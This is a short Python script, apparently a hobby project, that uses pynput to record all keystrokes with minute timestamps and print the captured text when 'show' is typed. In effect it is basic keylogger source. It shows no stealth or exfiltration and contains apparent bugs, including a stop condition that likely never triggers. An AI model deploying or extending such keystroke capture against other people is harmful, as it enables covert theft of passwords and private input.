from pynput.keyboard import Key, Listener, KeyCode
from _datetime import datetime
from spacial_chars import special_keys




def timestamp():
    this_time = datetime.now()
    return this_time.strftime("%d/%m/%y %H:%M")


def key_to_string(key):
    if isinstance(key, KeyCode):
        return key.char or ""
    return special_keys.get(key, f"<{key}>")


def record_press(key, recorded_content, all_content):
    time = timestamp()
    key_str = key_to_string(key)
    recorded_content.append(key_str)

    if time in all_content:
        all_content[time] = "".join(recorded_content)
    else:
        recorded_content.clear()
        recorded_content.append(key_str)
        all_content[time] = "".join(recorded_content)

    if "<CTRL><ALT>" in all_content[time]:
        return False





def print_when_show(key,dict_between_show,content_between_show):
    time = timestamp()
    key_str = key_to_string(key)
    content_between_show.append(key_str)

    if time in dict_between_show:
        dict_between_show[time] = "".join(content_between_show)
    else:
        content_between_show.clear()
        content_between_show.append(key_str)
        dict_between_show[time] = "".join(content_between_show)

    if "show" in dict_between_show[time]:
        dict_between_show[time].replace("show", "")
        for time, content in dict_between_show.items():
            print(f"\n**** {time} ****\n{content}")

        dict_between_show.clear()
        content_between_show.clear()



def listener():
    recorded_content = []
    content_between_show = []
    all_content = {}
    dict_between_show = {}




    def on_press(key):
        return record_press(key, recorded_content, all_content) ,print_when_show(key,dict_between_show,content_between_show)

    with Listener(on_press=on_press) as listener:
        listener.join()

    return all_content




listener()